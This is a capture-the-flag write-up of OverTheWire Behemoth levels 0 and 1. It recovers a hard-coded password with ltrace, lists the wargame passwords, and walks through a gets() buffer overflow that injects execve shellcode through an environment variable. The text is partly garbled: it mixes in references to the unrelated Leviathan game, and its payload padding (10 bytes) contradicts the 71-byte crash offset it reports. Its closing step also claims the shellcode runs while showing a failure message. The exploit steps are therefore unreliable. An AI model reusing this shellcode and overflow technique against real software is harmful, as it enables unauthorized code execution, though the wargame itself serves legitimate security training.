Overthewire Behemoth Wargame report

//Level 0 to Level 1

ssh behemoth.labs.overthewire.org -p 2221 -l behemoth0

Connect to the leviathan Level 0 server using SSH:
ssh behemoth.labs.overthewire.org -p 2221 -l behemoth0

Enter the password when prompted: leviathan0

Use the cd to /behemoth/. directory to find the data for the level. 
behemoth0@gibson:~$ ls -la
total 20
drwxr-xr-x  2 root root 4096 Apr 23 18:04 .
drwxr-xr-x 83 root root 4096 Apr 23 18:06 ..
-rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root  807 Jan  6  2022 .profile
behemoth0@gibson:~$ cd /behemoth/.
behemoth0@gibson:/behemoth$ ls -la
total 136
drwxr-xr-x  2 root      root       4096 Apr 23 18:04 .
drwxr-xr-x 25 root      root       4096 Apr 23 18:06 ..
-r-sr-x---  1 behemoth1 behemoth0 11648 Apr 23 18:04 behemoth0
-r-sr-x---  1 behemoth2 behemoth1 11256 Apr 23 18:04 behemoth1
-r-sr-x---  1 behemoth3 behemoth2 15112 Apr 23 18:04 behemoth2
-r-sr-x---  1 behemoth4 behemoth3 11300 Apr 23 18:04 behemoth3
-r-sr-x---  1 behemoth5 behemoth4 15108 Apr 23 18:04 behemoth4
-r-sr-x---  1 behemoth6 behemoth5 15392 Apr 23 18:04 behemoth5
-r-sr-x---  1 behemoth7 behemoth6 15132 Apr 23 18:04 behemoth6
-r-xr-x---  1 behemoth7 behemoth6 14916 Apr 23 18:04 behemoth6_reader
-r-sr-x---  1 behemoth8 behemoth7 11424 Apr 23 18:04 behemoth7
behemoth0@gibson:/behemoth$

When I execute the program it asks for a password. 

behemoth0@gibson:/behemoth$ ./behemoth0
Password: behemoth0
Access denied..
I run ltrace on the executable

behemoth0@gibson:/behemoth$ ltrace ./behemoth0
__libc_start_main(0x804921d, 1, 0xffffd5e4, 0 <unfinished ...>
printf("Password: ")                                          = 10
__isoc99_scanf(0x804a054, 0xffffd4df, 0x804a008, 0x804a020Password: coffee
)   = 1
strlen("OK^GSYBEX^Y")                                         = 11
strcmp("coffee", "eatmyshorts")                               = -1
puts("Access denied.."Access denied..
)                                       = 16
+++ exited (status 0) +++

I got the password comparison : strcmp("blah", "eatmyshorts")

behemoth0@gibson:/behemoth$ ./behemoth0
Password: eatmyshorts
Access granted..
$ cat /etc/behemoth_pass/behemoth1
8JHFW9vGru
$

//Level 1 to Level 2

ssh behemoth.labs.overthewire.org -p 2221 -l behemoth1

Connect to the leviathan Level 0 server using SSH:
ssh behemoth.labs.overthewire.org -p 2221 -l behemoth1

Enter the password when prompted: 8JHFW9vGru

The second level is similar to the first one but ltrace doesn't work here. 

behemoth1@gibson:/behemoth$ ltrace ./behemoth1
__libc_start_main(0x8049196, 1, 0xffffd5f4, 0 <unfinished ...>
printf("Password: ")                                                      = 10
gets(0xffffd4f5, 0, 0xf7c184be, 0xf7e2a054Password: pas
)                               = 0xffffd4f5
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                                   = 31
+++ exited (status 0) +++
behemoth1@gibson:/behemoth$`__libc_start_main(0x8049196, 1, 0xffffd5f4, 0 <unfinished ...>)`:



`__libc_start_main(0x8049196, 1, 0xffffd5f4, 0 <unfinished ...>)`:This is a call to the `__libc_start_main()` function, which is a C library function used to start a program. The arguments passed to the function include a memory address (`0x8049196`) which is the entry point of the program, and some other values related to the program's execution.

`printf("Password: ") = 10`:This line is calling the `printf()` function to print the string “Password: " to the console, and the return value of 10 indicates the number of characters printed.

`gets(0xffffd4f5, 0, 0xf7c184be, 0xf7e2a054Password: pas) = 0xffffd4f5`: This line is calling the ‘gets()`function to read user input from the console, and the address `0xffffd4f5` is where the input is being stored in memory. The input that was entered("pas") is also shown in the log. Note that ‘gets()` is considered to be a dangerous function because it does not limit the amount of input that can be read, which can lead to buffer overflow vulnerabilities.

`puts("Authentication failure.\nSorry."Authentication failure.\nSorry.) = 31`:This line is calling the `puts()` function to print the string "Authentication failure.\nSorry." to the console, and the return value of 31 indicates the number of characters printed.

I need to exploit the gets() function to overflow a buffer and spawn our shell. 
 

Overall, this code appears to be part of a program that prompts the user for a password, reads the user's input, and then outputs a message indicating whether the authentication was successful or not.
In this case, the "check" file is an executable that belongs to user leviathan2, and we have read and execute permissions. 

This code is a series of commands executed in a Linux terminal that demonstrate a simple buffer overflow attack. Here is a step-by-step guide:

1.  `tempdir=$(mktemp -d)`:`.  Create a temporary directory and store its path in the variable `$$tempdir`.
2. : cd $tempdir` Change the current working directory to the newly created temporary directory.
3. `vi getBufferSize.sh`: Open the text editor "vi" and create a new file named "getBufferSize.sh". This file will contain the code to would let us know when behemoth1 crashes to be used in the buffer overflow attack.
i=10
result='initial'

while [ ! -z "$result" ]
do
        i=$((i+1))
        result=$(python3 -c "print($i*'A')" | /behemoth/behemoth1)
        echo $result
done
echo "behemoth1 crashes at $i"

4. Save and exit the editor by typing `:wq` and pressing Enter. `chmod +x getBufferSize.sh`: Make the "getBufferSize.sh" file executable. And run it


Password: Authentication failure. Sorry.
Password: Authentication failure. Sorry.
...
Password: Authentication failure. Sorry.
Password: Authentication failure. Sorry.
Password: Authentication failure. Sorry.

behemoth1 crashes at, 71

5. We will use a shellcode to be used in the buffer overflow attack. In this case, the shellcode is:

export SHELLCODE=$(echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')


6. Then I used this c program from “Jon Erickson - Hacking_ The Art of Exploitation” to get the memory address
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
 char *ptr;
 if(argc < 3) {
 printf("Usage: %s <environment var> <target program name>\n", argv[0]);
 exit(0);
 }
 ptr = getenv(argv[1]); /* Get env var location. */
 ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
 printf("%s will be at %p\n", argv[1], ptr);
}"
It simply gets the memory location of the environment variable using getenv(), which returns a pointer to a string containing the value of the environment variable. 

7. `./getenvaddr SHELLCODE /behemoth/behemoth1`: I compiled the c code and  used it to determine the memory address of the shellcode in the "behemoth1" program's memory space. The address is printed out as "SHELLCODE will be at 0xffffd716".
8. ``python3 -c "print('A' * 10 + '\x16\xd7\xff\xff')" | /behemoth/behemoth1`: Then I used a  python script that prints out 10 'A's followed by the address of the shellcode in little-endian byte order, and pipe the output to the "behemoth1" program. This will cause a buffer overflow and execute the shellcode, resulting in the program displaying the message "Password: Authentication failure. Sorry." 